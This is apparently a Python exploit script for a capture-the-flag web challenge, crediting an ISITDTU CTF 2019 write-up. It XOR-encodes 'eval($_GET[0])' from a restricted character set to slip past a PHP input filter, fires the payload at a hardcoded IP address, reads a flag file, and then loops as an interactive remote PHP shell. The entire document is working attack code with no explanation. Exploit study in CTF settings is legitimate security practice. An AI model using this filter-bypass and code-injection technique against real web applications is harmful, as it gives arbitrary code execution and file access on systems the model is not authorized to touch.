#!/usr/bin/env python3

# Inspired by https://github.com/Samik081/ctf-writeups/blob/master/ISITDTU%20CTF%202019%20Quals/web/easyphp.md

import urllib.parse

import readline
import requests


BASE_URL = 'http://139.180.155.171/?calc='

abc = "0123456789+-*/().~^|&"


def find_combination(char_target):
    for a in abc:
        for b in abc:
            for c in abc:
                char = ord(a) ^ ord(b) ^ ord(c)
                if char == ord(char_target):
                    return (a, b, c)
    return False


SHELL = 'eval($_GET[0])'

s1 = ''
s2 = ''
s3 = ''

for a in SHELL:
    c1, c2, c3 = find_combination(a)
    s1 += c1
    s2 += c2
    s3 += c3

shellcode = "'{}'^'{}'^'{}'".format(s1, s2, s3)

print("Shellcode length:", len(shellcode))


#cmd = 'var_dump(scandir("."));'
cmd = 'var_dump(file_get_contents("fl4g1sH3re.php"));'

while True:
    payload = urllib.parse.quote_plus(shellcode) + '&0=' + cmd
    print(payload)

    url = BASE_URL + payload
    print(url)

    r = requests.get(url)
    print(r.text)

    cmd = input('php > ')
